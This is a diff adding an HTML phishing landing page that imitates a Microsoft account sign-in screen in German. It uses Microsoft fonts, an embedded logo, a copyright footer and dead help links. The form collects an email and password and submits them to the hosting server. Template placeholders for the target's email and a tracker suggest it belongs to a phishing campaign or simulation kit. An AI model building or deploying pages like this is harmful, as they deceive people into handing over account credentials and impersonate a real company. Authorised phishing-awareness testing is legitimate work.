@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8">
+	<title>Sign in to your account</title>
+
+	<style type="text/css">
+		@font-face {
+			font-family: "Segoe UI";
+			src: local("Segoe UI Light"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-light.woff2") format("woff2"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-light.woff") format("woff"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-light.ttf") format("truetype");
+			font-weight: 100;
+			font-style: normal;
+		}
+
+		@font-face {
+			font-family: "Segoe UI";
+			src: local("Segoe UI Semilight"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-semilight.woff2") format("woff2"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-semilight.woff") format("woff"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-semilight.ttf") format("truetype");
+			font-weight: 300;
+			font-style: normal;
+		}
+
+		@font-face {
+			font-family: "Segoe UI";
+			src: local("Segoe UI"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-regular.woff2") format("woff2"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-regular.woff") format("woff"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-regular.ttf") format("truetype");
+			font-weight: 400;
+			font-style: normal;
+		}
+
+		@font-face {
+			font-family: "Segoe UI";
+			src: local("Segoe UI Semibold"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-semibold.woff2") format("woff2"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-semibold.woff") format("woff"), url("https://static2.sharepointonline.com/files/fabric/assets/fonts/segoeui-westeuropean/segoeui-semibold.ttf") format("truetype");
+			font-weight: 600;
+			font-style: normal;
+		}
+
+		body {
+			background-color: #fefefe;
+			height:100%;
+			display: contents;
+			font-family: "Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+		}
+		a:link {
+			color: #0067b8;
+		}
+		a {
+			color: #ccc;
+			text-decoration: none;
+		}
+		a {
+			background-color: transparent;
+		}
+
+		div.wrapper {
+			display: block;
+			height: 100vh;
+			background-repeat: no-repeat,no-repeat;
+			background-position: center center,center center;
+			background-size: cover,cover;
+			background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjEwODAiIGZpbGw9Im5vbmUiPjxnIG9wYWNpdHk9Ii4yIiBjbGlwLXBhdGg9InVybCgjRSkiPjxwYXRoIGQ9Ik0xNDY2LjQgMTc5NS4yYzk1MC4zNyAwIDE3MjAuOC02MjcuNTIgMTcyMC44LTE0MDEuNlMyNDE2Ljc3LTEwMDggMTQ2Ni40LTEwMDgtMjU0LjQtMzgwLjQ4Mi0yNTQuNCAzOTMuNnM3NzAuNDI4IDE0MDEuNiAxNzIwLjggMTQwMS42eiIgZmlsbD0idXJsKCNBKSIvPjxwYXRoIGQ9Ik0zOTQuMiAxODE1LjZjNzQ2LjU4IDAgMTM1MS44LTQ5My4yIDEzNTEuOC0xMTAxLjZTMTE0MC43OC0zODcuNiAzOTQuMi0zODcuNi05NTcuNiAxMDUuNjAzLTk1Ny42IDcxNC0zNTIuMzggMTgxNS42IDM5NC4yIDE4MTUuNnoiIGZpbGw9InVybCgjQikiLz48cGF0aCBkPSJNMTU0OC42IDE4ODUuMmM2MzEuOTIgMCAxMTQ0LjItNDE3LjQ1IDExNDQuMi05MzIuNFMyMTgwLjUyIDIwLjQgMTU0OC42IDIwLjQgNDA0LjQgNDM3Ljg1IDQwNC40IDk1Mi44czUxMi4yNzYgOTMyLjQgMTE0NC4yIDkzMi40eiIgZmlsbD0idXJsKCNDKSIvPjxwYXRoIGQ9Ik0yNjUuOCAxMjE1LjZjNjkwLjI0NiAwIDEyNDkuOC00NTUuNTk1IDEyNDkuOC0xMDE3LjZTOTU2LjA0Ni04MTkuNiAyNjUuOC04MTkuNi05ODQtMzY0LjAwNS05ODQgMTk4LTQyNC40NDUgMTIxNS42IDI2NS44IDEyMTUuNnoiIGZpbGw9InVybCgjRCkiLz48L2c+PGRlZnM+PHJhZGlhbEdyYWRpZW50IGlkPSJBIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDE0NjYuNCAzOTMuNikgcm90YXRlKDkwKSBzY2FsZSgxNDAxLjYgMTcyMC44KSI+PHN0b3Agc3RvcC1jb2xvcj0iIzEwN2MxMCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M0YzRjNCIgc3RvcC1vcGFjaXR5PSIwIi8+PC9yYWRpYWxHcmFkaWVudD48cmFkaWFsR3JhZGllbnQgaWQ9IkIiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzk0LjIgNzE0KSByb3RhdGUoOTApIHNjYWxlKDExMDEuNiAxMzUxLjgpIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGQ0Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjYzRjNGM0IiBzdG9wLW9wYWNpdHk9IjAiLz48L3JhZGlhbEdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpZD0iQyIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxNTQ4LjYgOTUyLjgpIHJvdGF0ZSg5MCkgc2NhbGUoOTMyLjQgMTE0NC4yKSI+PHN0b3Agc3RvcC1jb2xvcj0iI2ZmYjkwMCIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlkPSJEIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDI2NS44IDE5OCkgcm90YXRlKDkwKSBzY2FsZSgxMDE3LjYgMTI0OS44KSI+PHN0b3Agc3RvcC1jb2xvcj0iI2Q4M2IwMSIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJFIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDE5MjB2MTA4MEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==");
+		}
+
+		.main {
+			display: table;
+			width: 100%;
+			height: 100%;
+		}
+		.container {
+			display: table-row;
+			height: 100%;
+		}
+		.middle {
+			display: table-cell;
+			vertical-align: middle;
+		}
+		.middle p {
+			padding: 0 16px;
+			margin: 0;
+		}
+
+		.login-form-holder {
+			margin: 0 auto 20px auto;
+			padding: 44px;
+			max-width: 440px;
+			min-width: 320px;
+			box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+			background: #ffffff;
+		}
+		.form-title {
+			margin: 16px 0 12px 0;
+			line-height: 1.75rem;
+			color: #1b1b1b;
+			font-size: 1.5rem;
+			font-weight: 600;
+		}
+		.form-fields {
+			margin: 0 0 16px 0;
+		}
+		.input-field {
+			margin: 0 0 16px 0;
+		}
+		input.input {
+			border-style: solid;
+			border-color: rgba(0,0,0,0,0.6);
+			border-width: 0 0 1px 0;
+			height: 16px;
+			width: 100%;
+			outline: none;
+			padding: 6px 10px 6px 0;
+			background-color: transparent;
+		}
+		.login-info {
+			margin-bottom: 16px;
+			font-size: 0.8125rem;
+		}
+
+		.buttons {
+			text-align: right;
+		}
+		.button-field {
+			display: inline-block;
+		}
+		.button {
+			padding: 4px 12px 4px 12px;
+			position: relative;
+			max-width: 100%;
+			text-align: center;
+			white-space: nowrap;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			min-height: 32px;
+			min-width: 108px;
+			line-height: normal;
+			margin-top: 0;
+			margin-bottom: 0;
+			display: block;
+			width: 100%;
+			border: none;
+		}
+		.btn-secondary {
+			color: #000;
+			background-color: rgba(0,0,0,0.2);
+		}
+		.btn-primary {
+			color: #fff;
+			background-color: #0067b8;
+		}
+
+		.sign-in-options {
+			padding: 8px 44px;
+			display: table;
+			width: 100%;
+		}
+		.medium {
+			width: 32px;
+			height: 32px;
+		}
+
+		footer {
+			position: absolute;
+			bottom: 5px; left: 5px; right: 5px;
+			color: rgba(0, 0, 0, 0.7);
+			text-align: right;
+			font-size: 0.8125rem;
+		}
+		footer a:link {
+			color: rgba(0, 0, 0, 0.7);
+		}
+		footer a {
+			margin: 0 8px;
+		}
+	</style>
+
+</head>
+<body>
+<div class="wrapper">
+
+<main class="main">
+<div class="container">
+<div class="middle">
+<div class="center">
+<div class="login-form-holder">
+<form action="" class="login-form" method="post" name="login-form">
+<div class="form-logo"><img alt="ms-logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAYCAMAAAAoC+goAAAACXBIWXMAAAsSAAALEgHS3X78AAAAP1BMVEX///9zc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3MApO9zc3N/ugDyUCL/uQArAW2eAAAAEHRSTlMAECAwQFBgcICQoLDA0ODwVOCoyAAAAa1JREFUSMft1MGO3CAQRdEHpqHAZZib5P+/NQsYd0eKetyTZBFp3sa2BD4qF2V9v0ff7tE/yRf2B8lm6QIW7VynbGZS8/QiFQ7ALmAJ6GvPALSBv4gZDC+65SsYs5QMoNApL2IOURr4JaxJkg6Az3TMOSRxCesQ5t0AafYwNXcvSmaxelas7t42ScHcvUiKzd1rVLJONzPoZh9iBllS43CQwCQDABkcYNuYz1lqAL4+OoxtLV0bPsJS55AC5BO7AYdVZED3OqBbhxEj7KnuisBhHcbtl8qeJkEqsKlAODGfhybKwKQCVVKBUpjnp87rDlmOnz17u0c/7rljAao6TSd2Hn+DIO2zqwH2CHjUXDq78BqmxkiQHjE7MZ1vFrjK4A4ovo4lGHT9vrKJrcqaFBsQnfHJynQA5QHrs2fbwlbPKuQYpAy5nT27ndhxDctAeMAy0G1nYXFArx16sGHFGWEDeh1waGEdWruChUHTAzaniXdMeayhWgNo55z1+I5VgOdYNIuSsm3zt//4B2k3pTU60dy9hHmzZ0mK1X0vQVK2LElb8/oc+9v5wv67/AT9zURQMuKvygAAAABJRU5ErkJggg==" /></div>
+
+<div class="form-elems">
+<h2 class="form-title">Anmelden</h2>
+
+<div class="form-fields">
+	<div class="login-field input-field"><input class="login-input input username" id="login-email" name="login-email" placeholder="E-Mail, Telefon oder Skype" required="" type="email" value="{{.Email}}" /></div>
+	<div class="login-field input-field"><input class="login-input input password" id="password" name="password" placeholder="Password" required="" type="password" /></div>
+</div>
+
+<div class="login-info">
+	<div class="forgot-pass">Kein Konto? <a href="javascript:void(0);">Erstellen Sie jetzt eins!</a></div>
+</div>
+<div class="login-info">
+	<div class="forgot-pass"><a href="javascript:void(0);">Kein Zugriff mehr auf ihr Konto?</a></div>
+</div>
+
+<div class="buttons">
+	<div class="login-field input-field button-field"><input class="btn btn-secondary button" type="button" value="Zur&uuml;ck" /></div>
+	<div class="login-field input-field button-field"><input class="btn btn-primary button" name="submit" type="submit" value="Anmelden" /></div>
+</div>
+
+</div>
+
+</form>
+</div>
+
+<div class="login-form-holder sign-in-options">
+	<div class="container">
+		<div class="middle medium"><img class="medium" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAACxUlEQVRoQ+2XgVXbMBCGT1kAOgFmAsIENROUDUg3gAmACcoG9QalCxQzAWGCwgSEBQj/r5z7/PywdYmUOn5Y7+kFbFn6v7vT6eRk4M0NXL+MAH17cPTA6IFIC3zeEMrzfB/G+yYyORVZTsUtM1l6cy5kIqW8yS3+/l2W5SLSyJ2fb+QBiL/ErOfo+0zEbiVc9XNKPFj9QPzkpiz/XG8LYi0ACM8g5Bc+mqrme/xfoM9h6TlFYswUP1N4YOYm8tWDOZkD5mQb3jADePFOHrzVl/JID0BQ2WVZfJMDtHBODlbekMPUEOsAUDytS/G5VYjuFYIeqaeOU4aTCQAirrAo4/6ZEFbxldAGxDW+53xJWhBAF//rQ0d8HPuwwfMZfn6oigs8LkLhhPd36ElDyQJAoT/R7yEyr1n1RaH4aIF3X0ImBTThubG/h4BDc1XvLQAfLgoxtOSeTvQKQfRQZ1Ov0Rg8H3B+xDcLAMMnQz+uUiWXVTE3KoEZqQjJ0RTLZPCE8Yeh8Zb3FgCf8rFgcKxlwVVmTTdfUFTqBVPPZwF4gsEOmiFksXZzTC2EnuFRhmV0swCwKEPRFp85+trEM4hn5uARcBJjMgBwo5+hs25KUhtZPMD0yDBiyvx3kG0C0iwrUkAEASi0VkpEWy41hAlAISjeF2SxlksJsQ5APZQYUiwHyq5QYjmt+ydrniOpIMwA6oUMv8xK9AQbAQr0x9qFhmNY78wYfRXgRwdhCoi1ACoxuid4paxqoTZHvFZj2k7yWIiNANQbDCkWZOy86PCwY+M1k4XeLesjy8kbA7ExQJvJm88rgObzVHtiZwBqXuW+Mme7rQO0ecS6JzCu8w69cwA1T/DGFyzjewMw7AnTvWEEsGajtnFtadaSfjnnf/eAdVMPDqDNQ6G7+M54YLAAsXuodw+MALEW6Pv7MYRGD0RaYPAh9A4IU2VAlxsRUgAAAABJRU5ErkJggg==" /></div>
+		<div class="middle"><p>Sign-in options</p></div>
+	</div>
+</div>
+
+{{.Tracker}}
+
+</div>
+</div>
+</div>
+</main>
+
+<footer class="footer">
+	<a href="javascript:void(0);">Terms of use</a>
+	<a href="javascript:void(0);">Privacy &amp; cookies</a>
+	<span>&copy; 2023 Microsoft</span>
+</footer>
+
+</div>
+</body>
+</html>
